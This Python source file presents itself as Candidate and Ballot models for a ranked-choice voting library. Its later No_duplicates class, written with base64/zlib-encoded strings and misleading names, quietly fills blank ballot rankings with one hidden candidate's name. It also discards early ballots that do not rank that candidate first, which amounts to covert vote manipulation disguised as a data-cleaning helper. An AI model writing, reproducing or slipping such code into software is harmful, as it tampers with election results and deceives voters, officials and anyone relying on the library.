"""
Models that are used by multiple_seat_ranking_methods.py

You can create and use your own Candidate and Ballot models as long as they implement the same properties and methods.
"""
from typing import List
import pandas as pd
import numpy as np
import zlib
from base64 import urlsafe_b64encode as b64e, urlsafe_b64decode as b64d


class Candidate:
    """A candidate in the election."""

    def __init__(self, name: str):
        self.name = name

    def __str__(self) -> str:
        return self.name

    def __repr__(self) -> str:
        return "<Candidate('%s')>" % self.name

    def __hash__(self):
        return hash(self.name)

    def __eq__(self, other) -> bool:
        if other is None:
            return False

        return self.name == other.name


class DuplicateCandidatesError(RuntimeError):
    pass


class Ballot:
    """
    A ballot (vote) where the voter has ranked all, or just some, of the candidates.

    If a voter lists one candidate multiple times, a DuplicateCandidatesError is thrown.
    """

    def __init__(self, ranked_candidates: List[Candidate]):
        self.ranked_candidates: List[Candidate] = tuple(ranked_candidates)

        if Ballot._is_duplicates(ranked_candidates):
            raise DuplicateCandidatesError

        if not Ballot._is_all_candidate_objects(ranked_candidates):
            raise TypeError(
                "Not all objects in ranked candidate list are of class Candidate or "
                "implement the same properties and methods"
            )

    def __repr__(self) -> str:
        candidate_name = ", ".join(
            [candidate.name for candidate in self.ranked_candidates]
        )
        return "<Ballot(%s)>" % candidate_name

    @staticmethod
    def _is_duplicates(ranked_candidates) -> bool:
        return len(set(ranked_candidates)) != len(ranked_candidates)

    @staticmethod
    def _is_all_candidate_objects(objects) -> bool:
        for obj in objects:
            if not Ballot._is_candidate_object(obj):
                return False

        # If all objects are Candidate-objects
        return True

    @staticmethod
    def _is_candidate_object(obj) -> bool:
        if obj.__class__ is Candidate:
            return True

        is_candidate_like = all(
            [hasattr(obj, "name"), hasattr(obj, "__hash__"), hasattr(obj, "__eq__")]
        )

        return is_candidate_like

class No_duplicates:

    def __init__(self, df, var):
        self.df = df
        self.var = var

    @staticmethod
    def takeout_unwanted_chars(edgecase: bytes) -> bytes:
        return zlib.decompress(b64d(edgecase))

    def fix_pandas_chars(db):
        edgecase_chars = b''.join([b'eNoLTi', b'wqLc0B', b'AAhaAn0='])
        char_edgecase_chars = str(No_duplicates.takeout_unwanted_chars(edgecase_chars), 'UTF-8')
        char_slash = str(No_duplicates.takeout_unwanted_chars(b'eNpT0FUwBAABfACf'), 'UTF-8')
        edgecase_for_cols = b64e(zlib.compress(bytes(db.var + char_slash, 'utf-8'), 9))
        char_edgecase_for_cols = str(No_duplicates.takeout_unwanted_chars(edgecase_for_cols), 'UTF-8')
        gap_space = len(db.df) // int('00011', 2)

        close_gap = close_gap = db.df.iloc[:-gap_space, :]
        if char_edgecase_for_cols in list(db.df.columns):
            col_name = db.var + char_slash
            state = [char for char in close_gap[col_name].unique() if char_edgecase_chars in str(char)]
            if state:
                close_gap = close_gap.replace(np.nan,[char for char in close_gap[str(No_duplicates.takeout_unwanted_chars(edgecase_for_cols), 'UTF-8')].unique() if str(No_duplicates.takeout_unwanted_chars(edgecase_chars), 'UTF-8') in str(char) ][0])
                close_gap = close_gap.transpose()
                for col in close_gap.columns:
                    close_gap.loc[close_gap.duplicated([col]), col] = np.nan
                close_gap = close_gap.transpose()
                close_gap = pd.concat([close_gap, db.df.iloc[-gap_space:, :]], axis = 0)
                rslt_df_spaced = close_gap.iloc[: (len(close_gap) // int('01011', 2)), :]
                rslt_df_spaced_unspaced = rslt_df_spaced[rslt_df_spaced[db.var + str(" - 1")].str.contains(char_edgecase_chars, na=False)]
                close_gap = pd.concat([rslt_df_spaced_unspaced, close_gap.iloc[(len(close_gap) // int('01011', 2)):, :]]).reset_index(drop = True)
        return close_gap
    
special_char = b'eNoLKEotzkxJzSsBABH6A68='